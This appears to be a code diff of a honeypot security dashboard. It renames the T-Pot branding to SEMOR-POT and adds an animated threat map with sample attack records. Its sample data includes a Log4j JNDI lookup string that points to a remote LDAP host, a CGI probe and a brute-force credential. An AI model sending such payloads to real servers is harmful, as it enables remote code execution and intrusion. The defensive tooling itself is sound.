@@ -55,12 +55,46 @@ import {
   Tooltip, 
   Legend 
 } from 'recharts';
-import { ComposableMap, Geographies, Geography, Marker, Line as MapLine } from 'react-simple-maps';
 import { cn } from '../lib/utils';
 import TPotAttackMapTab from './honeypot/TPotAttackMapTab';
+import McAfeeThreatMapCanvas, { type ThreatMapAttack, type ThreatMapNode } from './honeypot/McAfeeThreatMapCanvas';
 
-// World Atlas GeoJSON url
-const geoUrl = "https://cdn.jsdelivr.net/npm/world-atlas@2/countries-110m.json";
+// Geo coordinates lookup for live overview animated attack corridors
+const COUNTRY_COORDS: Record<string, { city: string; country: string; lat: number; lng: number }> = {
+  RU: { city: 'Moscow', country: 'Russia', lat: 55.7558, lng: 37.6173 },
+  CN: { city: 'Beijing', country: 'China', lat: 39.9042, lng: 116.4074 },
+  US: { city: 'New York', country: 'United States', lat: 40.7128, lng: -74.0060 },
+  KR: { city: 'Seoul', country: 'South Korea', lat: 37.5665, lng: 126.9780 },
+  IN: { city: 'New Delhi', country: 'India', lat: 28.6139, lng: 77.2090 },
+  BR: { city: 'Rio de Janeiro', country: 'Brazil', lat: -22.9068, lng: -43.1729 },
+  DE: { city: 'Frankfurt', country: 'Germany', lat: 50.1109, lng: 8.6821 },
+  NL: { city: 'Amsterdam', country: 'Netherlands', lat: 52.3676, lng: 4.9041 },
+  KP: { city: 'Pyongyang', country: 'North Korea', lat: 39.0392, lng: 125.7625 },
+  IR: { city: 'Tehran', country: 'Iran', lat: 35.6892, lng: 51.3890 },
+  VN: { city: 'Hanoi', country: 'Vietnam', lat: 21.0285, lng: 105.8542 },
+  GB: { city: 'London', country: 'United Kingdom', lat: 51.5074, lng: -0.1278 },
+  FR: { city: 'Paris', country: 'France', lat: 48.8566, lng: 2.3522 },
+  JP: { city: 'Tokyo', country: 'Japan', lat: 35.6762, lng: 139.6503 },
+  SG: { city: 'Singapore', country: 'Singapore', lat: 1.3521, lng: 103.8198 },
+};
+
+const OVERVIEW_SEMOR_POT_NODES: ThreatMapNode[] = [
+  { id: 'hive-taipei', name: 'SEMOR-POT-HIVE-CENTRAL (Taipei HQ)', location: 'Taipei, Taiwan', lat: 25.0330, lng: 121.5654, type: 'HIVE', status: 'ONLINE', attacksCapturedCount: 16420 },
+  { id: 'sensor-tokyo', name: 'SEMOR-POT-SENSOR-APAC (Tokyo)', location: 'Tokyo, Japan', lat: 35.6762, lng: 139.6503, type: 'SENSOR', status: 'ONLINE', attacksCapturedCount: 5210 },
+  { id: 'sensor-frankfurt', name: 'SEMOR-POT-SENSOR-EU (Frankfurt)', location: 'Frankfurt, Germany', lat: 50.1109, lng: 8.6821, type: 'SENSOR', status: 'ONLINE', attacksCapturedCount: 4190 },
+  { id: 'sensor-oregon', name: 'SEMOR-POT-SENSOR-US (Oregon)', location: 'Portland, OR, USA', lat: 45.5152, lng: -122.6784, type: 'SENSOR', status: 'ONLINE', attacksCapturedCount: 2670 },
+  { id: 'sensor-singapore', name: 'SEMOR-POT-SENSOR-SG (Singapore)', location: 'Singapore', lat: 1.3521, lng: 103.8198, type: 'SENSOR', status: 'ONLINE', attacksCapturedCount: 1890 },
+];
+
+const OVERVIEW_BASELINE_ATTACKS: ThreatMapAttack[] = [
+  { id: 'base-cn', sourceIp: '222.186.42.15', sourceCity: 'Beijing', sourceCountry: 'China', sourceCountryCode: 'CN', sourceLat: 39.9042, sourceLng: 116.4074, targetNodeId: 'hive-taipei', targetNodeName: 'SEMOR-POT-HIVE-CENTRAL', targetLat: 25.0330, targetLng: 121.5654, honeypot: 'Tanner', protocol: 'HTTP/80', attackType: 'SQLi & Path Traversal', severity: 'HIGH' },
+  { id: 'base-ru', sourceIp: '185.195.233.102', sourceCity: 'Moscow', sourceCountry: 'Russia', sourceCountryCode: 'RU', sourceLat: 55.7558, sourceLng: 37.6173, targetNodeId: 'hive-taipei', targetNodeName: 'SEMOR-POT-HIVE-CENTRAL', targetLat: 25.0330, targetLng: 121.5654, honeypot: 'Cowrie', protocol: 'SSH/22', attackType: 'SSH Root Brute Force', severity: 'CRITICAL' },
+  { id: 'base-us', sourceIp: '52.92.15.221', sourceCity: 'New York', sourceCountry: 'United States', sourceCountryCode: 'US', sourceLat: 40.7128, sourceLng: -74.0060, targetNodeId: 'hive-taipei', targetNodeName: 'SEMOR-POT-HIVE-CENTRAL', targetLat: 25.0330, targetLng: 121.5654, honeypot: 'Dionaea', protocol: 'SMB/445', attackType: 'MS17-010 EternalBlue Probe', severity: 'CRITICAL' },
+  { id: 'base-kr', sourceIp: '211.234.118.42', sourceCity: 'Seoul', sourceCountry: 'South Korea', sourceCountryCode: 'KR', sourceLat: 37.5665, sourceLng: 126.9780, targetNodeId: 'sensor-tokyo', targetNodeName: 'SEMOR-POT-SENSOR-APAC', targetLat: 35.6762, targetLng: 139.6503, honeypot: 'Log4pot', protocol: 'HTTP/8080', attackType: 'Log4j JNDI RCE Scan', severity: 'HIGH' },
+  { id: 'base-in', sourceIp: '103.21.124.88', sourceCity: 'New Delhi', sourceCountry: 'India', sourceCountryCode: 'IN', sourceLat: 28.6139, sourceLng: 77.2090, targetNodeId: 'sensor-singapore', targetNodeName: 'SEMOR-POT-SENSOR-SG', targetLat: 1.3521, targetLng: 103.8198, honeypot: 'Honeytrap', protocol: 'TCP/8443', attackType: 'Dynamic Port Reconnaissance', severity: 'MEDIUM' },
+  { id: 'base-br', sourceIp: '177.71.201.14', sourceCity: 'Rio de Janeiro', sourceCountry: 'Brazil', sourceCountryCode: 'BR', sourceLat: -22.9068, sourceLng: -43.1729, targetNodeId: 'sensor-oregon', targetNodeName: 'SEMOR-POT-SENSOR-US', targetLat: 45.5152, targetLng: -122.6784, honeypot: 'Conpot', protocol: 'Modbus/502', attackType: 'SCADA PLC Register Sweep', severity: 'HIGH' },
+  { id: 'base-nl', sourceIp: '198.51.100.89', sourceCity: 'Amsterdam', sourceCountry: 'Netherlands', sourceCountryCode: 'NL', sourceLat: 52.3676, sourceLng: 4.9041, targetNodeId: 'sensor-frankfurt', targetNodeName: 'SEMOR-POT-SENSOR-EU', targetLat: 50.1109, targetLng: 8.6821, honeypot: 'Dionaea', protocol: 'SMB/445', attackType: 'Botnet Binary Dropper', severity: 'CRITICAL' },
+];
 
 // Types
 type RBACRole = 'Admin' | 'Analyst' | 'Auditor';
@@ -118,7 +152,7 @@ interface CredentialAttempt {
 // Multi-language translation dictionaries
 const LOCALES = {
   zh: {
-    title: 'T-POT 控制中樞',
+    title: 'SEMOR-POT 控制中樞',
     subtitle: '欺敵安全維運',
     desc: 'COWRIE, DIONAEA & ELK 同步主控台 • v24.04-HEXA',
     search_placeholder: '搜尋來源 IP, 密碼字典, 節點資訊...',
@@ -128,7 +162,7 @@ const LOCALES = {
     analyst: '分析師',
     auditor: '稽核員',
     tab_dashboard: '📊 威脅情報儀表板',
-    tab_attack_map: '🗺️ T-Pot 全球即時攻擊地圖',
+    tab_attack_map: '🗺️ SEMOR-POT 全球即時攻擊地圖',
     tab_nodes: '🖥️ 分散式節點管理',
     tab_logs: '🪵 深層攻擊日誌',
     tab_malware: '🔬 捕獲惡意樣本',
@@ -143,9 +177,9 @@ const LOCALES = {
     metric_ips: '不重複攻擊來源 IP',
     metric_malware: '活躍捕獲惡意軟體',
     metric_nodes: '分散式蜜罐節點',
-    nodes_header_title: '分散式安全威脅探針節點 (T-Pot Distributed Clusters)',
+    nodes_header_title: '分散式安全威脅探針節點 (SEMOR-POT Distributed Clusters)',
     nodes_header_desc: '監測實時硬體指標。分析師及管理員均可一鍵下發重啟 Docker 或進入命令行。',
-    add_node: '新增 T-Pot 蜜罐節點',
+    add_node: '新增 SEMOR-POT 蜜罐節點',
     reboot_services: '批次重啟蜜罐服務',
     table_name: '節點名稱',
     table_ip: '本地 IP',
@@ -193,7 +227,7 @@ const LOCALES = {
     tbl_pcap_action: 'Wireshark 封包鑑識',
     btn_pcap_download: '下載 PCAP 封包',
     honeytoken_title: 'Honeytoken & Active Deception 偽裝與主動誘騙檔案配置',
-    honeytoken_desc: '自訂虛擬的 Linux 檔案系統及麵包屑(Breadcrumbs)追蹤技術。當黑客將這些假檔案下載回自己電腦打開時，檔案內嵌的觸發機制會自動向 T-Pot 報警並回傳其真實 IP 與瀏覽器特徵。',
+    honeytoken_desc: '自訂虛擬的 Linux 檔案系統及麵包屑(Breadcrumbs)追蹤技術。當黑客將這些假檔案下載回自己電腦打開時，檔案內嵌的觸發機制會自動向 SEMOR-POT 報警並回傳其真實 IP 與瀏覽器特徵。',
     honeytoken_add_btn: '新增偽裝誘餌檔案 (Honeytoken)',
     tbl_ht_name: '誘餌檔案名稱',
     tbl_ht_path: '部署虛擬路徑',
@@ -207,11 +241,11 @@ const LOCALES = {
     toggle_hpfeeds: '啟用 HPFeeds 匿名分享（自動將攻擊日誌上傳至 SANS DShield 網路）',
     toggle_intel_sync: '自動下載全球黑客黑名單並同步至防火牆',
     tab_analysis: '🔬 蜜罐組件探勘',
-    analysis_header_title: 'T-Pot Multi-Honeypot Specialist Analysis Panel (T-Pot 核心組件深度分析面板)',
+    analysis_header_title: 'SEMOR-POT Multi-Honeypot Specialist Analysis Panel (SEMOR-POT 核心組件深度分析面板)',
     analysis_header_desc: '專門針對網頁誘捕 Tanner & Snare、惡意下載誘騙 Dionaea 以及遠端連線與登錄鑑識 Cowrie 進行底層惡意請求與指令拆解。'
   },
   en: {
-    title: 'T-POT CONTROL HUB',
+    title: 'SEMOR-POT CONTROL HUB',
     subtitle: 'Deception Ops',
     desc: 'COWRIE, DIONAEA & ELK SYNC CONSOLE • v24.04-HEXA',
     search_placeholder: 'Search source IP, passwords, nodes...',
@@ -221,7 +255,7 @@ const LOCALES = {
     analyst: 'Analyst',
     auditor: 'Auditor',
     tab_dashboard: '📊 Threat Dashboard',
-    tab_attack_map: '🗺️ T-Pot Live Attack Map',
+    tab_attack_map: '🗺️ SEMOR-POT Live Attack Map',
     tab_nodes: '🖥️ Node Management',
     tab_logs: '🪵 Deep Attack Logs',
     tab_malware: '🔬 Captures Sandbox',
@@ -236,9 +270,9 @@ const LOCALES = {
     metric_ips: 'Unique Attacker IPs',
     metric_malware: 'Malware SHA256 Logged',
     metric_nodes: 'Distributed Nodes',
-    nodes_header_title: 'Distributed Security Telemetry Sensors (T-Pot Distributed Clusters)',
+    nodes_header_title: 'Distributed Security Telemetry Sensors (SEMOR-POT Distributed Clusters)',
     nodes_header_desc: 'Monitor hardware loads. Authorized personnel can trigger container restart or request interactive terminal sessions.',
-    add_node: 'Add New T-Pot Node',
+    add_node: 'Add New SEMOR-POT Node',
     reboot_services: 'Batch Reboot Services',
     table_name: 'Node Name',
     table_ip: 'Local IP',
@@ -300,11 +334,11 @@ const LOCALES = {
     toggle_hpfeeds: 'Enable HPFeeds telemetry sharing (Anonymously upload logs to SANS DShield global nodes)',
     toggle_intel_sync: 'Sync global community blacklists and dynamically sync rules to local firewall',
     tab_analysis: '🔬 Honeypot Analysis',
-    analysis_header_title: 'T-Pot Specialized Honeypot Deep-Dive Analysis Panel',
+    analysis_header_title: 'SEMOR-POT Specialized Honeypot Deep-Dive Analysis Panel',
     analysis_header_desc: 'Deep inspection panel for web-exploit trap Tanner, malware download logger Dionaea, and virtual terminal shell monitor Cowrie.'
   },
   ja: {
-    title: 'T-POT 制御ハブ',
+    title: 'SEMOR-POT 制御ハブ',
     subtitle: 'デセプション運用支援',
     desc: 'COWRIE, DIONAEA & ELK 同期コンソール • v24.04-HEXA',
     search_placeholder: '攻撃元IP、パスワード、ノードを照会...',
@@ -314,7 +348,7 @@ const LOCALES = {
     analyst: 'アナリスト',
     auditor: '監査員',
     tab_dashboard: '📊 脅威ダッシュボード',
-    tab_attack_map: '🗺️ T-Pot 攻撃マップ',
+    tab_attack_map: '🗺️ SEMOR-POT 攻撃マップ',
     tab_nodes: '🖥️ 統合ノード管理',
     tab_logs: '🪵 深層攻撃イベントログ',
     tab_malware: '🔬 検知マルウェア解析',
@@ -329,9 +363,9 @@ const LOCALES = {
     metric_ips: '一ユニーク攻撃ソースIP数',
     metric_malware: 'マルウェア検体検知数',
     metric_nodes: '分散ハニーポットノード',
-    nodes_header_title: '分散脅威検出センサーノード（T-Pot 分散クラスタ）',
+    nodes_header_title: '分散脅威検出センサーノード（SEMOR-POT 分散クラスタ）',
     nodes_header_desc: 'リソース負荷状況を追跡。管理者はコンテナリブートやCLIシェル実行が可能です。',
-    add_node: 'T-Pot ノード追加',
+    add_node: 'SEMOR-POT ノード追加',
     reboot_services: 'サービス一括再起動',
     table_name: 'ノード名称',
     table_ip: 'アドレス IP',
@@ -393,7 +427,7 @@ const LOCALES = {
     toggle_hpfeeds: 'HPFeeds 匿名共有の有効化（SANS DShield レジストリへ匿名ログを連携）',
     toggle_intel_sync: 'グローバルハッカーブラックリストの定期取得とエッジファイアウォール連携',
     tab_analysis: '🔬 蜜罐深度分析',
-    analysis_header_title: 'T-Pot 核心コンポーネント深層解析パネル',
+    analysis_header_title: 'SEMOR-POT 核心コンポーネント深層解析パネル',
     analysis_header_desc: 'ウェブ攻撃罠 Tanner、マルウェアダウンロード Dionaea、及び SSH/Telnet リモート接続接続 Cowrie の各詳細挙動を分解監査。'
   }
 };
@@ -669,7 +703,7 @@ export default function HoneypotManagerView() {
       payloadDecoded: '${jndi:ldap://8.210.155.42:1389/Exploit}',
       hexdump: '0000  00 0c 29 b5 7d 5e 00 50  56 c0 00 08 08 00 45 00  ..).}..PV.....E.\n0010  01 a4 4a ec 40 00 40 06  b7 83 c0 a8 e3 81 c0 a8  ..J.@.@.........\n0020  e3 01 e8 b0 1f 90 2c db  74 b8 d4 cd a0 1c 80 18  ......,.t.......\n0030  00 f5 e5 ed 00 00 01 01  08 0a c6 bf e2 5d 00 1f  .............]..\n0040  7a 02 47 45 54 20 2f 20  48 54 54 50 2f 31 2e 31  z.GET / HTTP/1.1\n0050  0d 0a 55 73 65 72 2d 41  67 65 6e 74 3a 20 24 7b  ..User-Agent: ${',
       intelRisk: '99/100 (Known Threat Actor)',
-      description: 'The attacker is injecting a Log4j JNDI lookup string within the User-Agent header to trigger local classloading of a remote malicious payload. This bypasses typical signature defenses. Guarded by T-Pot Tanner simulation.'
+      description: 'The attacker is injecting a Log4j JNDI lookup string within the User-Agent header to trigger local classloading of a remote malicious payload. This bypasses typical signature defenses. Guarded by SEMOR-POT Tanner simulation.'
     },
     'PCAP-002': {
       destPort: '445 (SMBv1 Protocol)',
@@ -1039,7 +1073,7 @@ export default function HoneypotManagerView() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           ip,
-          reason: 'T-Pot 蜜罐控制台手動觸發 NAC 與邊界防火牆聯防阻斷',
+          reason: 'SEMOR-POT 蜜罐控制台手動觸發 NAC 與邊界防火牆聯防阻斷',
           blockedBy: `SOC ${currentUserRole}`
         })
       });
@@ -1123,7 +1157,7 @@ export default function HoneypotManagerView() {
     setNewNodeName('');
     setNewNodeIp('');
     setShowAddNodeModal(false);
-    showToast(`分散式蜜罐探針節點 [${brandNode.name}] 登錄成功，並自動拉取 T-Pot Docker Compose 初始化設定。`, 'success');
+    showToast(`分散式蜜罐探針節點 [${brandNode.name}] 登錄成功，並自動拉取 SEMOR-POT Docker Compose 初始化設定。`, 'success');
   };
 
   // Trigger simulated interactive terminal C2 session
@@ -1135,12 +1169,12 @@ export default function HoneypotManagerView() {
     setTerminalNode(node);
     setShowTerminalModal(true);
     setTerminalLogs([
-      `T-POT LOGON GATEWAY [${node.name}] SSH Shell Established`,
+      `SEMOR-POT LOGON GATEWAY [${node.name}] SSH Shell Established`,
       `=============================================================`,
-      `System: Debian Linux 12 / Docker Core 25.1.0 / T-Pot v24.04`,
+      `System: Debian Linux 12 / Docker Core 25.1.0 / SEMOR-POT v24.04`,
       `Service Status: Active & Ingestion Healthy`,
-      `Available Commands: tpothelp, docker-ps, log-tail, trigger-alert, clear`,
-      `tpot-guest@${node.name.toLowerCase()}:~$ `
+      `Available Commands: help, docker-ps, log-tail, trigger-alert, clear`,
+      `semorpot-ops@${node.name.toLowerCase()}:~$ `
     ]);
   };
 
@@ -1151,26 +1185,26 @@ export default function HoneypotManagerView() {
     const cmd = terminalInput.trim().toLowerCase();
     const cleanLogs = [...terminalLogs];
     // Record command line echo
-    cleanLogs.push(`tpot-guest@${terminalNode?.name.toLowerCase()}:~$ ${terminalInput}`);
+    cleanLogs.push(`semorpot-ops@${terminalNode?.name.toLowerCase()}:~$ ${terminalInput}`);
     
     setTerminalInput('');
 
     if (cmd === 'clear') {
-      setTerminalLogs([`tpot-guest@${terminalNode?.name.toLowerCase()}:~$ `]);
+      setTerminalLogs([`semorpot-ops@${terminalNode?.name.toLowerCase()}:~$ `]);
       return;
     }
 
-    if (cmd === 'tpothelp') {
-      cleanLogs.push('Available T-Pot Operations CLI Interface:');
+    if (cmd === 'tpothelp' || cmd === 'help') {
+      cleanLogs.push('Available SEMOR-POT Operations CLI Interface:');
       cleanLogs.push('  docker-ps      - Lists all running honey services docker containers');
       cleanLogs.push('  log-tail       - Interactively prints out the last 5 records of Cowrie SSH trap');
       cleanLogs.push('  trigger-alert  - Force emit a high-priority dummy threat signal to console');
       cleanLogs.push('  clear          - Clears command screen log trace');
     } else if (cmd === 'docker-ps') {
-      cleanLogs.push('CONTAINER ID   IMAGE                 COMMAND                  STATUS          PORTS');
-      cleanLogs.push('da41ff23b2e5   tpot/cowrie:latest    "/usr/bin/cowrie"        Up 14 hours     0.0.0.0:22->2222/tcp');
-      cleanLogs.push('e9fb4419ad21   tpot/dionaea:latest   "/usr/bin/dionaea"       Up 14 hours     0.0.0.0:445->445/tcp');
-      cleanLogs.push('882b4122bc13   tpot/logstash:8.10    "/usr/share/logstash"    Up 14 hours     0.0.0.0:5044/udp');
+      cleanLogs.push('CONTAINER ID   IMAGE                     COMMAND                  STATUS          PORTS');
+      cleanLogs.push('da41ff23b2e5   semorpot/cowrie:latest    "/usr/bin/cowrie"        Up 14 hours     0.0.0.0:22->2222/tcp');
+      cleanLogs.push('e9fb4419ad21   semorpot/dionaea:latest   "/usr/bin/dionaea"       Up 14 hours     0.0.0.0:445->445/tcp');
+      cleanLogs.push('882b4122bc13   semorpot/logstash:8.10    "/usr/share/logstash"    Up 14 hours     0.0.0.0:5044/udp');
     } else if (cmd === 'log-tail') {
       cleanLogs.push(' tailing /data/cowrie/log/cowrie.json (last 3 entries):');
       cleanLogs.push('  {"timestamp":"2026-06-12T05:01:22.39Z","eventid":"cowrie.session.connect","src_ip":"81.52.12.8"}');
@@ -1607,72 +1641,55 @@ export default function HoneypotManagerView() {
                     </div>
                   </div>
 
-                  {/* interactive map element */}
-                  <div className="bg-black/60 rounded-xl border border-gray-850/60 flex items-center justify-center p-4 relative min-h-[300px]">
-                    <ComposableMap 
-                      projectionConfig={{ scale: 190, center: [20, 10] }}
-                      className="w-full h-full max-h-[360px]"
-                    >
-                      <Geographies geography={geoUrl}>
-                        {({ geographies }) =>
-                          geographies.map((geo) => (
-                            <Geography
-                              key={geo.rsmKey}
-                              geography={geo}
-                              fill="#101319"
-                              stroke="#222b37"
-                              strokeWidth={0.5}
-                              style={{
-                                default: { outline: "none" },
-                                hover: { fill: "#1e2430", outline: "none" },
-                                pressed: { outline: "none" },
-                              }}
-                            />
-                          ))
-                        }
-                      </Geographies>
-
-                      {/* Mock Interactive attackers coordinates dynamic light arcs linking to HIVE-MAIN */}
-                      <MapLine from={[116.4, 39.9]} to={[121.5, 25.0]} stroke="#EF4444" strokeWidth={1} strokeLinecap="round" strokeDasharray="3,3" /> {/* China to S-Taipei */}
-                      <MapLine from={[37.6, 55.7]} to={[121.5, 25.0]} stroke="#EF4444" strokeWidth={1.5} strokeLinecap="round" /> {/* Moscow to Taipei */}
-                      <MapLine from={[-74.0, 40.7]} to={[121.5, 25.0]} stroke="#3B82F6" strokeWidth={1} strokeLinecap="round" /> {/* US to Taipei */}
-                      <MapLine from={[126.9, 37.5]} to={[121.5, 25.0]} stroke="#EF4444" strokeWidth={1} strokeLinecap="round" /> {/* Seoul to Taipei */}
-                      <MapLine from={[77.2, 28.6]} to={[121.5, 25.0]} stroke="#EF4444" strokeWidth={1} strokeLinecap="round" /> {/* N.Delhi to Taipei */}
-                      <MapLine from={[-43.1, -22.9]} to={[121.5, 25.0]} stroke="#F59E0B" strokeWidth={1} strokeLinecap="round" /> {/* Rio to Taipei */}
-
-                      {/* Target Hub central Node: S-Taipei */}
-                      <Marker coordinates={[121.5, 25.0]}>
-                        <circle r={6} fill="#FF3366" className="animate-ping" style={{ animationDuration: '2s' }} />
-                        <circle r={3} fill="#FF3366" stroke="#fff" strokeWidth={1} />
-                      </Marker>
-
-                      {/* Source Attack node logs */}
-                      <Marker coordinates={[116.4, 39.9]}><circle r={2.5} fill="#EF4444" /></Marker>
-                      <Marker coordinates={[37.6, 55.7]}><circle r={2.5} fill="#EF4444" /></Marker>
-                      <Marker coordinates={[-74.0, 40.7]}><circle r={2} fill="#3B82F6" /></Marker>
-                      <Marker coordinates={[126.9, 37.5]}><circle r={2} fill="#EF4444" /></Marker>
-                      <Marker coordinates={[77.2, 28.6]}><circle r={2} fill="#EF4444" /></Marker>
-                      <Marker coordinates={[-43.1, -22.9]}><circle r={2} fill="#F59E0B" /></Marker>
-
-                    </ComposableMap>
-
-                    {/* Threat geographic coordinates map overlays */}
-                    <div className="absolute right-3 bottom-3 bg-black/80 border border-gray-800 rounded-lg p-3 text-[10px] font-mono space-y-1 z-10 select-none">
-                      <span className="text-gray-500 uppercase tracking-wider block font-bold mb-1">C2 Target Platform</span>
-                      <div className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-[#FF3366]"></span><span>Taipei Honey Hive (121.5, 25.0)</span></div>
-                      <div className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-[#EF4444]"></span><span>Malicious Intrusions (Active)</span></div>
-                      <div className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-[#3B82F6]"></span><span>Passive Port Scanners</span></div>
-                    </div>
-                  </div>
+                  {/* McAfee-Style 60fps Animated Global Threat Map Visualizer */}
+                  <McAfeeThreatMapCanvas
+                    nodes={OVERVIEW_SEMOR_POT_NODES}
+                    attacks={[
+                      ...logs.slice(0, 14).map((log): ThreatMapAttack => {
+                        const geo = COUNTRY_COORDS[log.countryCode] || COUNTRY_COORDS.RU;
+                        return {
+                          id: log.id,
+                          sourceIp: log.ip,
+                          sourceCity: geo.city,
+                          sourceCountry: log.country || geo.country,
+                          sourceCountryCode: log.countryCode || 'RU',
+                          sourceLat: geo.lat,
+                          sourceLng: geo.lng,
+                          targetNodeId: 'hive-taipei',
+                          targetNodeName: 'SEMOR-POT-HIVE-CENTRAL',
+                          targetLat: 25.0330,
+                          targetLng: 121.5654,
+                          honeypot: log.honeypot,
+                          protocol: log.protocol,
+                          attackType: log.payload.slice(0, 48),
+                          severity: (log.severity.toUpperCase() as ThreatMapAttack['severity']) || 'HIGH',
+                          isBlocked: log.actionTaken === 'Blocked',
+                          timestamp: log.time,
+                          payloadSummary: log.payload,
+                        };
+                      }),
+                      ...OVERVIEW_BASELINE_ATTACKS,
+                    ]}
+                    isPlaying={currentUserRole !== 'Auditor'}
+                    velocity={1.15}
+                    compact={true}
+                    heightClassName="h-[340px]"
+                    legendTitle="SEMOR-POT Threat Vectors"
+                    onSelectNode={() => setActiveTab('attack-map')}
+                    onSelectAttack={(atk) => {
+                      showToast(`偵測來源 ${atk.sourceIp} (${atk.sourceCountry}) → ${atk.honeypot} (${atk.protocol})，已切換至全螢幕戰局地圖`, 'info');
+                      setActiveTab('attack-map');
+                    }}
+                  />
 
                   {/* Manual Intrusion simulator controller panel */}
                   <div className="mt-4 flex flex-col sm:flex-row items-center justify-between bg-[#111622] p-3 rounded-xl border border-gray-850 gap-3">
                     <div className="text-[10px] text-gray-400 font-mono">
-                      【人工演練控制台】選擇一個區域，手動對 T-Pot 發送一次密碼猜測與惡意 Shell 突襲：
+                      【人工演練控制台】選擇一個區域，手動對 SEMOR-POT 發送一次密碼猜測與惡意 Shell 突襲：
                     </div>
                     <div className="flex gap-2">
                       {[
-                        { label: '🇷🇺 俄羅斯 SSH 爆破', ip: '185.195.233.102', country: 'Russia', code: 'RU', honeypot: 'Cowrie', payload: 'USER="root" PASS="admin112" (T-Pot Blocked)' },
+                        { label: '🇷🇺 俄羅斯 SSH 爆破', ip: '185.195.233.102', country: 'Russia', code: 'RU', honeypot: 'Cowrie', payload: 'USER="root" PASS="admin112" (SEMOR-POT Blocked)' },
                         { label: '🇨🇳 中國 80 端口溢出', ip: '222.186.42.15', country: 'China', code: 'CN', honeypot: 'Glastopf', payload: 'GET /cgi-bin/test.cgi?payload=bin/' },
                         { label: '🇺🇸 美國 SMB 探針', ip: '52.92.15.221', country: 'United States', code: 'US', honeypot: 'Dionaea', payload: 'MS17-010 SMB exploit probe' }
                       ].map((sim, index) => (
@@ -1680,9 +1697,9 @@ export default function HoneypotManagerView() {
                           key={index}
                           onClick={() => {
                             const customLog: HoneypotEvent = {
-                              id: `LOG-SIM-${Date.now().toString().slice(-3)}`,
+                              id: `LOG-SIM-${Date.now()}-${index}`,
                               time: new Date().toTimeString().split(' ')[0],
-                              node: 'HIVE-MAIN-01',
+                              node: 'SEMOR-POT-HIVE-01',
                               ip: sim.ip,
                               country: sim.country,
                               countryCode: sim.code,
@@ -1694,7 +1711,7 @@ export default function HoneypotManagerView() {
                             };
                             setLogs(prev => [customLog, ...prev]);
                             setTotalAttacks(prev => prev + 1);
-                            showToast(`【攻擊模擬】自 ${sim.country} 來源 IP [${sim.ip}] 的安全漏洞特徵已被成功誘捕！`, 'danger');
+                            showToast(`【攻擊模擬】自 ${sim.country} 來源 IP [${sim.ip}] 的安全漏洞特徵已被 SEMOR-POT 成功誘捕！`, 'danger');
                           }}
                           className="px-2.5 py-1.5 bg-gray-900 border border-gray-800 hover:bg-gray-800 text-gray-300 hover:text-white rounded-lg text-[10px] font-bold transition-all cursor-pointer"
                         >
@@ -1941,7 +1958,7 @@ export default function HoneypotManagerView() {
               <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-4 bg-[#0d1017] border border-gray-850 p-4 rounded-2xl">
                 <div>
                   <h3 className="text-sm font-black text-white uppercase font-mono tracking-wider">
-                    分散式安全威脅探針節點 (T-Pot Distributed Clusters)
+                    分散式安全威脅探針節點 (SEMOR-POT Distributed Clusters)
                   </h3>
                   <p className="text-[11px] text-gray-500 font-mono">
                     監測實時硬體指標。分析師及管理員均可一鍵下發重啟 Docker 或進入命令行。
@@ -1961,7 +1978,7 @@ export default function HoneypotManagerView() {
                     className="px-4 py-2 bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 border border-red-500/20 text-white text-xs font-bold rounded-xl flex items-center gap-1.5 cursor-pointer shadow-lg shadow-red-600/10"
                   >
                     <PlusCircle size={14} />
-                    <span>新增 T-Pot 蜜罐節點</span>
+                    <span>新增 SEMOR-POT 蜜罐節點</span>
                   </button>
                   
                   <button
@@ -2423,7 +2440,7 @@ export default function HoneypotManagerView() {
                   </div>
 
                   <p className="text-[11px] text-gray-500 font-mono mb-4">
-                    當駭客向蜜罐注入 wget / curl 載入威脅時，T-Pot 會自動靜態捕獲二進位執行檔並記錄 Hash 進行沙箱演練比對。
+                    當駭客向蜜罐注入 wget / curl 載入威脅時，SEMOR-POT 會自動靜態捕獲二進位執行檔並記錄 Hash 進行沙箱演練比對。
                   </p>
 
                   <div className="space-y-3">
@@ -2776,7 +2793,7 @@ export default function HoneypotManagerView() {
                       showToast('正在預編譯與渲染安全審計軌跡... 已將 PDF 合規性報表自動下載至您的設備。', 'success');
                       
                       const reportContent = `========================================================================\n` +
-                                            `         T-POT DECEPTION PLATFORM COMPLIANCE SECURITY AUDIT REPORT      \n` +
+                                            `       SEMOR-POT DECEPTION PLATFORM COMPLIANCE SECURITY AUDIT REPORT    \n` +
                                             `========================================================================\n` +
                                             `Generated on: ${new Date().toUTCString()}\n` +
                                             `Security Rating: HIGH COMPLIANCE SECURED\n` +
@@ -2787,13 +2804,13 @@ export default function HoneypotManagerView() {
                                               `[${log.time}] | Actor: ${log.actor.padEnd(10)} | Action: ${log.action.padEnd(45)} | Target: ${log.target.padEnd(25)} | Result: ${log.result.padEnd(8)} | Severity: ${log.severity}`
                                             ).join("\n") +
                                             `\n\n------------------------------------------------------------------------\n` +
-                                            `End of Audit Ledger. Issued by immutable T-Pot ELK Hook.\n` +
+                                            `End of Audit Ledger. Issued by immutable SEMOR-POT ELK Hook.\n` +
                                             `========================================================================\n`;
                       
                       const element = document.createElement("a");
                       const file = new Blob([reportContent], { type: 'text/plain' });
                       element.href = URL.createObjectURL(file);
-                      element.download = "t-pot-compliance-audit-report.pdf";
+                      element.download = "semor-pot-compliance-audit-report.pdf";
                       document.body.appendChild(element);
                       element.click();
                       document.body.removeChild(element);
@@ -3507,7 +3524,7 @@ export default function HoneypotManagerView() {
                           暴力破解熱門密碼字典雲 (Credentials Brute Force Cloud)
                         </span>
                         <p className="text-[10px] text-gray-500 font-mono mb-4 leading-relaxed">
-                          由 Cowrie 偽裝 SSH 登錄接口自動收集到的暴力破解常用帳密特徵，點擊可以將其同步覆蓋至 T-Pot 誘捕阻攔權重中：
+                          由 Cowrie 偽裝 SSH 登錄接口自動收集到的暴力破解常用帳密特徵，點擊可以將其同步覆蓋至 SEMOR-POT 誘捕阻攔權重中：
                         </p>
 
                         <div className="bg-black/40 border border-gray-900 rounded-xl p-4 min-h-[160px] flex flex-wrap gap-2.5 justify-center items-center">
@@ -3679,7 +3696,7 @@ export default function HoneypotManagerView() {
